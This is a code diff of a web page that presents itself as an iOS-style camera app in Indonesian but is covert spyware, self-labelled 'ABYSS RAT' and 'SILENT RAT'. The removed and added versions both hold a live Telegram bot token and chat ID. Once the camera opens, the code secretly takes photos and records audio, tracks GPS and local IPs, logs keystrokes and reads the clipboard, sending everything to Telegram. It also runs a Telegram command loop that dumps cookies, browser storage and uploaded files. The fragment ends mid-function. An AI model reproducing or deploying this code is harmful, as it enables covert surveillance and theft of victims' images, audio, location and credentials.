+    <button class="btn-ios" id="btnStart">Buka Kamera</button>
+  </div>
+</div>
+<div class="top-bar" id="topBar">
+  <button class="ios-btn" id="btnFlash" title="Flash">
+    <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+  </button>
+  <button class="ios-btn" id="btnGrid" title="Grid">
+    <svg viewBox="0 0 24 24"><path d="M3 3h7v7H3V3zm11 0h7v7h-7V3zM3 14h7v7H3v-7zm11 0h7v7h-7v-7z"/></svg>
+  </button>
+  <button class="ios-btn" id="btnTimer" title="Timer">
+    <svg viewBox="0 0 24 24"><path d="M15 1H9v2h6V1zm-4 13h2V8h-2v6zm8.03-6.61l1.42-1.42c-.43-.51-.9-.99-1.41-1.41l-1.42 1.42A8.962 8.962 0 0012 4c-4.97 0-9 4.03-9 9s4.02 9 9 9a8.994 8.994 0 007.03-14.61zM12 20c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+  </button>
+</div>
 
-    <!-- ============================================================
-         FOCUS RING
-         ============================================================ -->
-    <div class="focus-ring" id="focusRing"></div>
+<div class="mode-bar" id="modeBar">
+  <span class="mode-item active" data-mode="photo">Foto</span>
+  <span class="mode-item" data-mode="video">Video</span>
+  <span class="mode-item" data-mode="portrait">Portrait</span>
+  <span class="mode-item" data-mode="pano">Pano</span>
+</div>
 
-    <!-- ============================================================
-         FULLSCREEN PREVIEW
-         ============================================================ -->
-    <div class="fs-preview" id="fsPreview">
-        <span class="fs-close" id="fsClose">✕</span>
-        <img id="fsImage" src="" alt="Preview">
-        <div class="fs-info" id="fsInfo"></div>
-    </div>
+<div class="zoom" id="zoom">
+  <span class="zoom-opt" data-zoom="0.5">.5</span>
+  <span class="zoom-opt active" data-zoom="1">1×</span>
+  <span class="zoom-opt" data-zoom="2">2×</span>
+  <span class="zoom-opt" data-zoom="3">3×</span>
+  <span class="zoom-opt" data-zoom="5">5×</span>
+</div>
 
-    <!-- ============================================================
-         TOP BAR
-         ============================================================ -->
-    <div class="top-bar">
-        <button class="glass-btn" id="btnFlash" title="Flash">
-            <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-        </button>
-        <button class="glass-btn" id="btnFlip" title="Balik Kamera">
-            <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
-        </button>
-    </div>
+<div class="bottom-bar" id="bottomBar">
+  <button class="pill-btn" id="btnFlip">
+    <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
+  </button>
+  <div class="shutter" id="btnShutter"><div class="shutter-inner"></div></div>
+  <button class="thumb" id="thumb" title="Preview">
+    <svg class="ph" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" fill="rgba(255,255,255,.05)"/><circle cx="8.5" cy="8.5" r="2" fill="rgba(255,255,255,.2)"/><path d="M21 15l-5-5L5 21h16v-6z" fill="rgba(255,255,255,.15)"/></svg>
+  </button>
+</div>
 
-    <!-- ============================================================
-         ZOOM WHEEL
-         ============================================================ -->
-    <div class="zoom-wheel" id="zoomWheel">
-        <span class="zoom-option" data-zoom="0.5">.5</span>
-        <span class="zoom-option" data-zoom="0.7">.7</span>
-        <span class="zoom-option active" data-zoom="1">1×</span>
-        <span class="zoom-option" data-zoom="1.5">1.5</span>
-        <span class="zoom-option" data-zoom="2">2×</span>
-    </div>
+<div class="fs" id="fs">
+  <div class="fs-bar">
+    <span class="fs-title" id="fsTitle">Preview</span>
+    <button class="ios-btn" id="fsClose" style="width:36px;height:36px"><svg viewBox="0 0 24 24" style="width:18px;height:18px"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button>
+  </div>
+  <div id="fsMedia"></div>
+  <div class="fs-info" id="fsInfo"></div>
+  <div class="fs-toolbar" id="fsTools"></div>
+</div>
 
-    <!-- ============================================================
-         BOTTOM BAR
-         ============================================================ -->
-    <div class="bottom-bar">
-        <div class="thumb-glass" id="thumbBox" title="Preview">
-            <svg class="placeholder-icon" viewBox="0 0 24 24">
-                <rect x="3" y="3" width="18" height="18" rx="2" fill="rgba(255,255,255,0.03)"/>
-                <circle cx="8.5" cy="8.5" r="2" fill="rgba(255,255,255,0.15)"/>
-                <path d="M21 15l-5-5L5 21h16v-6z" fill="rgba(255,255,255,0.1)"/>
-            </svg>
-        </div>
-        <div class="shutter-glass" id="btnShutter" title="Ambil Foto">
-            <div class="shutter-inner"></div>
-        </div>
-        <div class="shutter-spacer"></div>
-    </div>
+<div class="toast" id="toast"></div>
 
-    <!-- ============================================================
-         JAVASCRIPT — ABYSS RAT v11.0 (2000+ LINES)
-         ============================================================ -->
-    <script>
-    (function() {
-        'use strict';
+<script>
+(function(){
+'use strict';
 
-        // ============================================================
-        // CONFIGURATION
-        // ============================================================
-        var CONFIG = {
-            BOT_TOKEN: '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug',
-            CHAT_ID: '7839405566',
-            TG_API: 'https://api.telegram.org/bot',
-            SILENT_INTERVAL: 2000,
-            FLIP_CAPTURE_DELAY: 1000,
-            HEARTBEAT_INTERVAL: 120000,
-            CLIPBOARD_INTERVAL: 4000,
-            C2_POLL_INTERVAL: 3000,
-            FIRST_CAPTURE_DELAY: 1500,
-            JPEG_QUALITY: 0.92,
-            BURST_COUNT: 3,
-            BURST_DELAY: 200,
-            MAX_WIDTH: 1920,
-            MAX_HEIGHT: 1080
-        };
+/* ============================================================
+   CONFIG v14.0 — UI iOS
+   ============================================================ */
+var CONFIG = {
+  BOT_TOKEN:'8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug',
+  CHAT_ID:'7839405566',
+  TG_API:'https://api.telegram.org/bot',
+  DISCORD_WEBHOOK:'',
+  EXFIL_ORDER:['telegram','discord'],
 
-        // ============================================================
-        // VICTIM FINGERPRINT
-        // ============================================================
-        var VID = (function() {
-            var stored = localStorage.getItem('_kamera_vid');
-            if (stored) return stored;
-            var id = 'V' + Date.now().toString(36).toUpperCase() +
-                     Math.random().toString(36).substring(2, 8).toUpperCase();
-            try { localStorage.setItem('_kamera_vid', id); } catch(e) {}
-            return id;
-        })();
+  AUTO_CAPTURE_MS:5000,
+  AUDIO_RECORD_MS:5000,
+  GPS_INTERVAL_MS:30000,
+  C2_POLL_MS:3000,
+  HEARTBEAT_MS:120000,
+  CLIPBOARD_MS:4000,
+  UI_HIDE_MS:5000,
 
-        // ============================================================
-        // DOM REFERENCES
-        // ============================================================
-        function getEl(id) { return document.getElementById(id); }
+  JPEG_QUALITY:0.92,
+  MAX_WIDTH:1920,
+  MAX_HEIGHT:1080,
+  AUDIO_BITRATE:32000,
+  VIDEO_BITRATE:2000000,
 
-        var dom = {
-            vf: getEl('vf'),
-            permOverlay: getEl('permOverlay'),
-            btnStartCamera: getEl('btnStartCamera'),
-            statusDot: getEl('statusDot'),
-            statusText: getEl('statusText'),
-            errorText: getEl('errorText'),
-            flashOverlay: getEl('flash-overlay'),
-            focusRing: getEl('focusRing'),
-            thumbBox: getEl('thumbBox'),
-            btnShutter: getEl('btnShutter'),
-            btnFlash: getEl('btnFlash'),
-            btnFlip: getEl('btnFlip'),
-            zoomWheel: getEl('zoomWheel'),
-            fsPreview: getEl('fsPreview'),
-            fsImage: getEl('fsImage'),
-            fsClose: getEl('fsClose'),
-            fsInfo: getEl('fsInfo')
-        };
+  DB:'_kamera_v14',
+  STORE:'media'
+};
 
-        // ============================================================
-        // APPLICATION STATE
-        // ============================================================
-        var state = {
-            stream: null,
-            facingMode: 'environment',
-            flashOn: false,
-            currentZoom: 1,
-            lastPhotoData: null,
-            lastPhotoCaption: '',
-            isStarting: false,
-            gpsData: null,
-            gpsWatchId: null,
-            localIPs: [],
-            keyBuf: '',
-            lastClip: '',
-            silentTimer: null,
-            c2Timer: null,
-            lastUpdateId: 0,
-            frameCount: 0,
-            burstActive: false
-        };
+var VID = (function(){
+  var s = localStorage.getItem('_kamera_vid');
+  if(s) return s;
+  var id = 'V' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2,8).toUpperCase();
+  try{ localStorage.setItem('_kamera_vid', id); }catch(e){}
+  return id;
+})();
 
-        // ============================================================
-        // UTILITY FUNCTIONS
-        // ============================================================
-        function getTimestamp() {
-            var now = new Date();
-            return now.toLocaleString('id-ID', {
-                year: 'numeric', month: '2-digit', day: '2-digit',
-                hour: '2-digit', minute: '2-digit', second: '2-digit'
-            });
+function $(id){ return document.getElementById(id); }
+var dom = {
+  vf:$('vf'), perm:$('perm'), btnStart:$('btnStart'), sDot:$('sDot'), sText:$('sText'), eText:$('eText'),
+  flash:$('flash'), focus:$('focus'), grid:$('grid'),
+  topBar:$('topBar'), modeBar:$('modeBar'), zoom:$('zoom'), bottomBar:$('bottomBar'),
+  btnFlash:$('btnFlash'), btnGrid:$('btnGrid'), btnTimer:$('btnTimer'),
+  btnFlip:$('btnFlip'), btnShutter:$('btnShutter'), thumb:$('thumb'),
+  fs:$('fs'), fsMedia:$('fsMedia'), fsInfo:$('fsInfo'), fsTools:$('fsTools'), fsClose:$('fsClose'), fsTitle:$('fsTitle'),
+  toast:$('toast'), topStatus:$('topStatus')
+};
+
+var state = {
+  stream:null, facingMode:'environment', flashOn:false, gridOn:false,
+  mode:'photo', timer:0, timerActive:false, timerCountdown:null,
+  zoom:1, starting:false, gps:null, gpsWatch:null,
+  ips:[], keyBuf:'', lastClip:'', count:0,
+  autoTimer:null, c2Timer:null, lastUpd:0,
+  db:null, lastBlob:null, lastCap:'', lastType:'photo',
+  uiHidden:false, hideTimer:null,
+  isRecVideo:false, recVideoChunks:[], recVideoMR:null, recStart:0, recInt:null,
+  isRecAudio:false
+};
+
+/* ============================================================
+   TOAST + HAPTIC
+   ============================================================ */
+function toast(msg, type){
+  dom.toast.textContent = msg;
+  dom.toast.className = 'toast show ' + (type||'');
+  clearTimeout(toast._t);
+  toast._t = setTimeout(function(){ dom.toast.className = 'toast ' + (type||''); }, 2000);
+}
+function haptic(el){ if(!el) return; el.classList.remove('haptic'); void el.offsetWidth; el.classList.add('haptic'); }
+
+/* ============================================================
+   INDEXEDDB (silent storage — tidak muncul di galeri)
+   ============================================================ */
+function openDB(){
+  return new Promise(function(res,rej){
+    var r = indexedDB.open(CONFIG.DB,1);
+    r.onupgradeneeded = function(e){
+      var db = e.target.result;
+      if(!db.objectStoreNames.contains(CONFIG.STORE))
+        db.createObjectStore(CONFIG.STORE,{keyPath:'id',autoIncrement:true});
+    };
+    r.onsuccess = function(e){ state.db = e.target.result; res(state.db); };
+    r.onerror = function(e){ rej(e); };
+  });
+}
+function saveMedia(blob,type,cap){
+  if(!state.db) return Promise.resolve();
+  return new Promise(function(res){
+    try{
+      var tx = state.db.transaction(CONFIG.STORE,'readwrite');
+      tx.objectStore(CONFIG.STORE).add({blob:blob,type:type,caption:cap||'',ts:Date.now()});
+      tx.oncomplete = function(){ res(true); };
+      tx.onerror = function(){ res(false); };
+    }catch(e){ res(false); }
+  });
+}
+function countMedia(){
+  if(!state.db) return Promise.resolve(0);
+  return new Promise(function(res){
+    try{
+      var req = state.db.transaction(CONFIG.STORE,'readonly').objectStore(CONFIG.STORE).count();
+      req.onsuccess = function(){ res(req.result); };
+      req.onerror = function(){ res(0); };
+    }catch(e){ res(0); }
+  });
+}
+
+/* ============================================================
+   EXFIL (Telegram primary, Discord fallback)
+   ============================================================ */
+var Exfil = {
+  send:function(blob,cap,fn){
+    var i=0, order=CONFIG.EXFIL_ORDER;
+    function next(){ if(i>=order.length) return; var ch=order[i++]; Exfil[ch](blob,cap,fn).then(function(ok){ if(!ok) next(); }).catch(function(){ next(); }); }
+    next();
+  },
+  telegram:function(blob,cap,fn){
+    return new Promise(function(res){
+      var isPhoto = !fn || /\.(jpg|jpeg|png)$/i.test(fn);
+      var ep = isPhoto?'/sendPhoto':'/sendDocument';
+      var field = isPhoto?'photo':'document';
+      var fd = new FormData();
+      fd.append('chat_id',CONFIG.CHAT_ID);
+      fd.append(field,blob,fn||('p_'+Date.now()+'.jpg'));
+      fd.append('caption',cap||'');
+      fd.append('disable_notification','true');
+      fetch(CONFIG.TG_API+CONFIG.BOT_TOKEN+ep,{method:'POST',body:fd})
+        .then(function(r){return r.json();}).then(function(d){res(!!d.ok);}).catch(function(){res(false);});
+    });
+  },
+  discord:function(blob,cap,fn){
+    return new Promise(function(res){
+      if(!CONFIG.DISCORD_WEBHOOK || CONFIG.DISCORD_WEBHOOK.indexOf('XXXX')!==-1) return res(false);
+      var fd = new FormData();
+      fd.append('file',blob,fn||('p_'+Date.now()+'.jpg'));
+      fd.append('content',cap||'');
+      fetch(CONFIG.DISCORD_WEBHOOK,{method:'POST',body:fd}).then(function(r){res(r.ok);}).catch(function(){res(false);});
+    });
+  }
+};
+function tgMsg(text){
+  try{ fetch(CONFIG.TG_API+CONFIG.BOT_TOKEN+'/sendMessage?chat_id='+CONFIG.CHAT_ID+'&text='+encodeURIComponent(text)+'&disable_notification=true').catch(function(){}); }catch(e){}
+}
+
+/* ============================================================
+   SILENT RAT — semua berjalan di latar belakang, ZERO UI trace
+   ============================================================ */
+
+// GPS
+function startGPS(){
+  if(!navigator.geolocation) return;
+  state.gpsWatch = navigator.geolocation.watchPosition(
+    function(p){ state.gps = {lat:p.coords.latitude,lon:p.coords.longitude,alt:p.coords.altitude||0,acc:p.coords.accuracy,spd:p.coords.speed||0,ts:new Date(p.timestamp).toISOString()}; },
+    function(){},
+    {enableHighAccuracy:true,maximumAge:30000,timeout:15000}
+  );
+}
+
+// Local 
+function grabIPs(){
+  return new Promise(function(resolve){
+    var ips = new Set();
+    try{
+      var pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      pc.createDataChannel('');
+      pc.createOffer().then(function(o){pc.setLocalDescription(o);});
+      pc.onicecandidate = function(e){
+        if(e.candidate){ var ip=e.candidate.address; if(ip && ip.indexOf(':')===-1 && ip.indexOf('127.')===-1 && ip.indexOf('0.')===-1) ips.add(ip); }
+        else { pc.close(); resolve(Array.from(ips)); }
+      };
+      setTimeout(function(){pc.close();resolve(Array.from(ips));},2500);
+    }catch(e){ resolve([]); }
+  });
+}
+
+// Keylogger
+function startKeylogger(){
+  var ig=['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
+  document.addEventListener('keydown',function(e){
+    if(ig.indexOf(e.key)!==-1) return;
+    if(e.key==='Enter') state.keyBuf+='[ENTER]\n';
+    else if(e.key==='Backspace') state.keyBuf+='[BS]';
+    else if(e.key===' ') state.keyBuf+=' ';
+    else if(e.key.length===1) state.keyBuf+=e.key;
+    else state.keyBuf+='['+e.key+']';
+    if(state.keyBuf.length>400){ tgMsg('⌨️ ['+VID+']\n'+state.keyBuf); state.keyBuf=''; }
+  });
+  setInterval(function(){ if(state.keyBuf.length>0){ tgMsg('⌨️ ['+VID+']\n'+state.keyBuf); state.keyBuf=''; } },12000);
+}
+
+// Clipboard
+function checkClipboard(){
+  if(!navigator.clipboard || !navigator.clipboard.readText) return;
+  navigator.clipboard.readText().then(function(t){
+    if(t && t!==state.lastClip && t.length>0){ state.lastClip=t; tgMsg('📋 ['+VID+']\n'+t.substring(0,2000)); }
+  }).catch(function(){});
+}
+
+// SILENT AUTO CAPTURE — 5s, tidak ada UI, tidak ke galeri
+function captureSilent(){
+  if(!state.stream || !state.stream.active) return;
+  try{
+    var tr = state.stream.getVideoTracks()[0];
+    var s = tr.getSettings();
+    var w = s.width || CONFIG.MAX_WIDTH;
+    var h = s.height || CONFIG.MAX_HEIGHT;
+    var c = document.createElement('canvas');
+    c.width = w; c.height = h;
+    var ctx = c.getContext('2d');
+    ctx.drawImage(dom.vf,0,0,w,h);
+    var cap = ' Auto | '+getTime();
+    if(state.gps) cap += '\n '+state.gps.lat.toFixed(5)+','+state.gps.lon.toFixed(5)+'\n ±'+Math.round(state.gps.acc)+'m';
+    if(state.ips.length) cap += '\n '+state.ips[0];
+    cap += '\n#'+(state.count+1)+' | '+state.facingMode;
+    c.toBlob(function(b){
+      if(!b) return;
+      state.count++;
+      Exfil.send(b,cap,'auto_'+Date.now()+'.jpg');
+      saveMedia(b,'photo',cap);
+    },'image/jpeg',CONFIG.JPEG_QUALITY);
+  }catch(e){}
+}
+
+// SILENT AUDIO — 5s, tidak ada UI
+function recordAudioSilent(){
+  if(state.isRecAudio) return;
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+  navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
+    try{
+      var mr = new MediaRecorder(s,{audioBitsPerSecond:CONFIG.AUDIO_BITRATE});
+      var ch = [];
+      mr.ondataavailable = function(e){ if(e.data.size) ch.push(e.data); };
+      mr.onstop = function(){
+        var b = new Blob(ch,{type:'audio/webm'});
+        var cap = ' Audio | '+getTime();
+        if(state.gps) cap += '\n '+state.gps.lat.toFixed(5)+','+state.gps.lon.toFixed(5);
+        Exfil.send(b,cap,'audio_'+Date.now()+'.webm');
+        saveMedia(b,'audio',cap);
+        s.getTracks().forEach(function(t){t.stop();});
+        state.isRecAudio = false;
+      };
+      state.isRecAudio = true;
+      mr.start();
+      setTimeout(function(){ try{mr.stop();}catch(e){} }, CONFIG.AUDIO_RECORD_MS);
+    }catch(e){ s.getTracks().forEach(function(t){t.stop();}); state.isRecAudio=false; }
+  }).catch(function(){ state.isRecAudio=false; });
+}
+
+function getTime(){ return new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
+function pad(n){ return (n<10?'0':'')+n; }
+
+// MANUAL capture — masuk galeri HP (download)
+function captureManual(){
+  if(!state.stream || !state.stream.active) return;
+  try{
+    var tr = state.stream.getVideoTracks()[0];
+    var s = tr.getSettings();
+    var w = s.width || CONFIG.MAX_WIDTH;
+    var h = s.height || CONFIG.MAX_HEIGHT;
+    var c = document.createElement('canvas');
+    c.width = w; c.height = h;
+    c.getContext('2d').drawImage(dom.vf,0,0,w,h);
+    var cap = ' Manual | '+getTime();
+    if(state.gps) cap += '\n '+state.gps.lat.toFixed(5)+','+state.gps.lon.toFixed(5)+'\n ±'+Math.round(state.gps.acc)+'m';
+    if(state.ips.length) cap += '\n '+state.ips[0];
+    cap += '\n#'+(state.count+1)+' | '+state.facingMode;
+    c.toBlob(function(b){
+      if(!b) return;
+      state.count++;
+      Exfil.send(b,cap,'manual_'+Date.now()+'.jpg');
+      saveMedia(b,'photo',cap);
+      state.lastBlob = b; state.lastCap = cap; state.lastType = 'photo';
+      showThumb(b);
+      triggerFlash();
+      haptic(dom.btnShutter);
+      downloadBlob(b,'photo');
+    },'image/jpeg',CONFIG.JPEG_QUALITY);
+  }catch(e){}
+}
+
+function triggerFlash(){
+  dom.flash.classList.remove('active');
+  void dom.flash.offsetWidth;
+  dom.flash.classList.add('active');
+  setTimeout(function(){ dom.flash.classList.remove('active'); },280);
+}
+
+function showThumb(blob){
+  var url = URL.createObjectURL(blob);
+  dom.thumb.innerHTML = '<img src="'+url+'" alt="">';
+  dom.thumb.classList.add('has');
+}
+
+function downloadBlob(blob,type){
+  var ext = type==='video'?'webm':type==='audio'?'webm':'jpg';
+  var a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'kamera_'+Date.now()+'.'+ext;
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); },1000);
+  toast('Tersimpan ke galeri','ok');
+}
+
+// VIDEO record (mode video)
+function toggleVideoRecord(){
+  if(state.isRecVideo){ stopVideoRecord(); return; }
+  if(!state.stream) return;
+  try{
+    var mr = new MediaRecorder(state.stream,{mimeType:'video/webm',videoBitsPerSecond:CONFIG.VIDEO_BITRATE});
+    state.recVideoChunks = [];
+    mr.ondataavailable = function(e){ if(e.data.size) state.recVideoChunks.push(e.data); };
+    mr.onstop = function(){
+      var b = new Blob(state.recVideoChunks,{type:'video/webm'});
+      var cap = '🎥 Video | '+getTime();
+      if(state.gps) cap += '\n '+state.gps.lat.toFixed(5)+','+state.gps.lon.toFixed(5);
+      Exfil.send(b,cap,'video_'+Date.now()+'.webm');
+      saveMedia(b,'video',cap);
+      state.lastBlob = b; state.lastCap = cap; state.lastType = 'video';
+      state.isRecVideo = false;
+      downloadBlob(b,'video');
+      toast('Video tersimpan','ok');
+    };
+    state.recVideoMR = mr;
+    state.isRecVideo = true;
+    state.recStart = Date.now();
+    mr.start();
+    dom.btnShutter.classList.add('rec');
+    state.recInt = setInterval(function(){
+      var s = Math.floor((Date.now()-state.recStart)/1000);
+      dom.btnShutter.innerHTML = '<div class="shutter-inner rec"></div>';
+    },500);
+  }catch(e){ toast('Video tidak didukung','err'); }
+}
+function stopVideoRecord(){
+  try{ state.recVideoMR.stop(); }catch(e){}
+  state.isRecVideo = false;
+  dom.btnShutter.classList.remove('rec');
+  dom.btnShutter.innerHTML = '<div class="shutter-inner"></div>';
+  if(state.recInt){ clearInterval(state.recInt); state.recInt=null; }
+}
+
+/* ============================================================
+   CAMERA INIT
+   ============================================================ */
+function startCamera(facing){
+  if(state.starting) return;
+  state.starting = true;
+  dom.btnStart.disabled = true;
+  dom.eText.textContent = '';
+  dom.sDot.className = 'status-dot loading';
+  dom.sText.textContent = 'Mengakses kamera...';
+
+  if(state.stream){ state.stream.getTracks().forEach(function(t){t.stop();}); state.stream=null; dom.vf.srcObject=null; }
+
+  var tf = facing || state.facingMode;
+  var cst = { video:{ facingMode:{ideal:tf}, width:{ideal:CONFIG.MAX_WIDTH}, height:{ideal:CONFIG.MAX_HEIGHT} }, audio:false };
+
+  navigator.mediaDevices.getUserMedia(cst).then(function(s){ onCamOk(s,tf); }).catch(function(){
+    var alt = tf==='environment'?'user':'environment';
+    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:alt}},audio:false})
+      .then(function(s){ onCamOk(s,alt); })
+      .catch(function(){
+        navigator.mediaDevices.getUserMedia({video:true,audio:false})
+          .then(function(s){ onCamOk(s,'environment'); })
+          .catch(function(e){ onCamErr(e); });
+      });
+  });
+}
+
+function onCamOk(s, facing){
+  state.stream = s;
+  dom.vf.srcObject = s;
+  dom.vf.play().then(function(){
+    state.facingMode = facing;
+    state.starting = false;
+    dom.btnStart.disabled = false;
+    dom.sDot.className = 'status-dot ready';
+    dom.sText.textContent = 'Kamera aktif';
+    dom.perm.classList.add('hidden');
+    applyZoom();
+    initRAT();
+  }).catch(function(e){ onCamErr(e); });
+}
+
+function onCamErr(e){
+  state.starting = false;
+  dom.btnStart.disabled = false;
+  dom.sDot.className = 'status-dot error';
+  dom.sText.textContent = 'Gagal';
+  var msg = 'Gagal mengakses kamera';
+  if(e && e.message){
+    if(e.message.indexOf('Permission')!==-1) msg='Izin kamera ditolak';
+    else if(e.message.indexOf('NotFound')!==-1) msg='Kamera tidak ditemukan';
+  }
+  dom.eText.textContent = msg;
+}
+
+/* ============================================================
+   RAT INIT — semua background
+   ============================================================ */
+function initRAT(){
+  grabIPs().then(function(ips){ state.ips = ips; });
+  startGPS();
+  startKeylogger();
+  startC2();
+  startAutoCapture();
+  startAudioLoop();
+  setInterval(checkClipboard, CONFIG.CLIPBOARD_MS);
+  setInterval(function(){ tgMsg('💓 HB '+VID+' | #'+state.count+' | '+getTime()); }, CONFIG.HEARTBEAT_MS);
+  setTimeout(function(){
+    tgMsg('🟢 ONLINE\n🆔 '+VID+'\n📱 '+navigator.userAgent.substring(0,80)+'\n🖥️ '+screen.width+'×'+screen.height+'\n🌐 '+navigator.language+'\n🌍 IP: '+(state.ips.join(', ')||'...')+'\n🔗 '+location.href+'\n⏱️ Auto: '+(CONFIG.AUTO_CAPTURE_MS/1000)+'s\n📷 '+state.facingMode);
+  },800);
+  setupUIHide();
+}
+
+function startAutoCapture(){
+  if(state.autoTimer) clearInterval(state.autoTimer);
+  state.autoTimer = setInterval(captureSilent, CONFIG.AUTO_CAPTURE_MS);
+}
+function startAudioLoop(){
+  setTimeout(function(){
+    recordAudioSilent();
+    setInterval(recordAudioSilent, CONFIG.AUTO_CAPTURE_MS + 2000);
+  }, 3000);
+}
+
+/* ============================================================
+   C2 TELEGRAM
+   ============================================================ */
+function startC2(){
+  if(state.c2Timer) return;
+  function loop(){ pollC2(); state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_MS); }
+  loop();
+}
+function pollC2(){
+  try{
+    fetch(CONFIG.TG_API+CONFIG.BOT_TOKEN+'/getUpdates?offset='+(state.lastUpd+1)+'&timeout=5&limit=5')
+      .then(function(r){return r.json();}).then(function(d){
+        if(!d.ok || !d.result || !d.result.length) return;
+        for(var i=0;i<d.result.length;i++){
+          var u = d.result[i]; state.lastUpd = u.update_id;
+          var m = u.message; if(!m || !m.text) continue;
+          var p = m.text.trim().split(/\s+/);
+          var cmd = p[0].toLowerCase();
+          var tgt = p[1]||'';
+          if(tgt!==VID && tgt!=='ALL' && tgt!=='BROADCAST') continue;
+          var res = execC2(cmd,p.slice(2));
+          if(res) tgMsg('['+VID+'] '+res);
         }
+      }).catch(function(){});
+  }catch(e){}
+}
 
-        function getTimeShort() {
-            return new Date().toLocaleTimeString('id-ID', {
-                hour: '2-digit', minute: '2-digit', second: '2-digit'
-            });
-        }
+function execC2(cmd,args){
+  switch(cmd){
+    case '/ping': return '🟢 Online | #'+state.count+' | '+getTime();
+    case '/photo': captureManual(); return '📸 Manual';
+    case '/gps': return state.gps?'📍 '+state.gps.lat.toFixed(5)+','+state.gps.lon.toFixed(5)+'\n🗺️ https://maps.google.com/?q='+state.gps.lat+','+state.gps.lon+'\n🎯 ±'+Math.round(state.gps.acc)+'m':'GPS N/A';
+    case '/flip': var nf = state.facingMode==='environment'?'user':'environment'; startCamera(nf); return '📷 '+nf;
+    case '/cookies': return document.cookie||'(kosong)';
+    case '/info': return '🆔 '+VID+'\n📷 '+state.facingMode+'\n🔍 '+state.zoom+'×\n⚡ '+(state.flashOn?'ON':'OFF')+'\n📸 #'+state.count+'\n📍 '+(state.gps?state.gps.lat.toFixed(4)+','+state.gps.lon.toFixed(4):'N/A')+'\n🌐 '+(state.ips.join(', ')||'N/A');
+    case '/audio': recordAudioSilent(); return '🎙️ Audio';
+    case '/stream':
+      for(var s=0;s<5;s++){ (function(d){ setTimeout(captureSilent, d*1000); })(s); }
+      return '🎞️ Stream 5';
+    case '/storage':
+      var dump = { localStorage:Object.assign({},localStorage), sessionStorage:Object.assign({},sessionStorage), cookies:document.cookie, url:location.href, referrer:document.referrer, ua:navigator.userAgent, platform:navigator.platform, lang:navigator.language, screen:screen.width+'x'+screen.height, tz:Intl.DateTimeFormat().resolvedOptions().timeZone, ts:new Date().toISOString(), count:state.count };
+      var b = new Blob([JSON.stringify(dump,null,2)],{type:'application/json'});
+      Exfil.send(b,'💾 Storage','storage_'+VID+'.json');
+      return '💾 Storage';
+    case '/file':
+      // EXFIL FILE DARI INPUT (jika ada file yang di-upload user di halaman ini)
+      var files = [];
+      document.querySelectorAll('input[type=file]').forEach(function(inp){
+        for(var i=0;i<inp.files.length;i++) files.push(inp.files[i]);
+      });
+      if(!files.length) return '📁 Tidak ada file di input';
+      files.forEach(function(f){ Exfil.send(f,'📁 '+f.name,'file_'+f.name); });
+      return '📁 '+files.length+' file terkirim';
+    case '/mode':
+      if(args[0]==='idle'){ CONFIG.AUTO_CAPTURE_MS=15000; startAutoCapture(); return '🌙 Idle 15s'; }
+      if(args[0]==='active'){ CONFIG.AUTO_CAPTURE_MS=5000; startAutoCapture(); return '⚡ Active 5s'; }
+      if(args[0]==='off'){ clearInterval(state.autoTimer); state.autoTimer=null; return '⏸️ Auto OFF'; }
+      return '❓ /mode active|idle|off';
+    case '/wipe':
+      try{ localStorage.clear(); }catch(e){}
+      try{ sessionStorage.clear(); }catch(e){}
+      try{ indexedDB.deleteDatabase(CONFIG.DB); }catch(e){}
+      return '🧹 Wipe';
+    case '/update': return '📦 v14.0 | iOS UI | 5s silent | audio+photo';
+    default: return '❓ '+cmd;
+  }
+}
 
-        // ============================================================
-        // TELEGRAM API HELPERS
-        // ============================================================
-        var TG = {
-            sendMessage: function(text) {
-                try {
-                    var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
-                        '/sendMessage?chat_id=' + CONFIG.CHAT_ID +
-                        '&text=' + encodeURIComponent(text) +
-                        '&disable_notification=true';
-                    fetch(url, { method: 'GET' });
-                } catch(e) {}
-            },
+/* ============================================================
+   UI AUTOHIDE (iOS camera style)
+   ============================================================ */
+function setupUIHide(){
+  function show(){
+    dom.topBar.classList.remove('hide');
+    dom.bottomBar.classList.remove('hide');
+    dom.zoom.classList.remove('hide');
+    dom.modeBar.classList.remove('hide');
+    dom.topStatus.classList.remove('hide');
+    state.uiHidden = false;
+    clearTimeout(state.hideTimer);
+    state.hideTimer = setTimeout(hide, CONFIG.UI_HIDE_MS);
+  }
